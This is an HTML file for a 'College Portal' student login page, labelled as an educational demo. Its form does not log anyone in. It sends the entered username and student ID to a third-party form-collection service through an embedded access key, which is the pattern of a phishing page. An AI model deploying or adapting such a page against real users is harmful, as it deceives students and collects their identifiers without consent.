<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Login Demo</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:linear-gradient(135deg,#4facfe,#00f2fe);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:360px;
    background:#fff;
    padding:30px;
    border-radius:12px;
    box-shadow:0 10px 25px rgba(0,0,0,0.2);
    text-align:center;
}

.logo{
    width:100px;
    margin-bottom:15px;
}

h2{
    color:#003366;
    margin-bottom:8px;
}

p{
    color:#666;
    margin-bottom:20px;
}

.input-box{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:6px;
    font-size:16px;
}

.input-box:focus{
    border-color:#0d6efd;
    outline:none;
}

button{
    width:100%;
    padding:12px;
    background:#0d6efd;
    color:white;
    border:none;
    border-radius:6px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0b5ed7;
}

.footer{
    margin-top:15px;
    font-size:12px;
    color:#777;
}
</style>

</head>
<body>

<div class="container">

    <!-- Optional: Upload your logo as logo.png -->
    <!-- <img src="logo.png" class="logo" alt="College Logo"> -->

    <h2>College Portal</h2>
    <p>Student Login Demo</p>

    <form action="https://api.web3forms.com/submit" method="POST">

        <!-- Your Web3Forms Access Key -->
        <input type="hidden" name="access_key" value="102fa59e-746c-44f8-b18a-6ec31528e755">

        <!-- Optional: Redirect after successful submission -->
        <!-- <input type="hidden" name="redirect" value="https://yourusername.github.io/thankyou.html"> -->

        <input
            class="input-box"
            type="text"
            name="Username"
            placeholder="Enter Username"
            required>

        <input
            class="input-box"
            type="text"
            name="Student_ID"
            placeholder="Enter Student ID"
            required>

        <button type="submit">Login</button>

    </form>

    <div class="footer">
        Demo project for educational purposes.
    </div>

</div>

</body>
</html>
